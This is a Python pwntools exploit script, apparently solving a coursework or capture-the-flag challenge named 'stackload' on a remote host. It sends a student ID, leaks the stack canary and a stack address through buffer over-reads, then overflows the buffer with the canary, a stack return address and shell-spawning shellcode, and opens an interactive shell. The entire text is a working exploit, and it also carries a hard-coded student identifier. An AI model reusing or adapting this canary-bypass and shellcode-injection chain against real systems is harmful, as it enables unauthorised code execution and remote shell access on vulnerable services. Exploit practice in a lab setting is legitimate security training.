from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

DEBUG = 0
REMOTE = 1

if REMOTE:
    p = remote("8.154.20.109", 10601)
    p.recvuntil(b"Please input your StudentID:")
    p.send(b"3220103784\n")
else:
    p = process("./stackload")

# First input: Leak canary
p.recvuntil(b"Please input data:\n")
payload1 = b"A" * 25 # Fill buffer + padding to reach canary + overwrite canaty \x00
p.send(payload1)
p.recvuntil(b"Buffer content:" + b"A" * 25)
canary = b"\x00" + p.recv(7) # Canary is 8 bytes, first byte is always \x00
log.success(f"Canary: {hex(u64(canary))}")

# Second input: Leak stack address
p.recvuntil(b"Please input data:\n")
payload2 = b"A" * 32 # Buffer + canary + try to leak saved rbp
p.send(payload2)
p.recvuntil(b"Buffer content:" + b"A" * 32)
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.success(f"Stack leak: {hex(stack_leak)}")

# Third input: Send shellcode
shellcode = asm(shellcraft.sh())
info(f"shellcode len = {len(shellcode)}")
payload = b"A"*24 + canary + b"A"*8 + p64(stack_leak) + shellcode
log.success(f"length: {len(payload)}")
p.send(payload)

p.interactive()

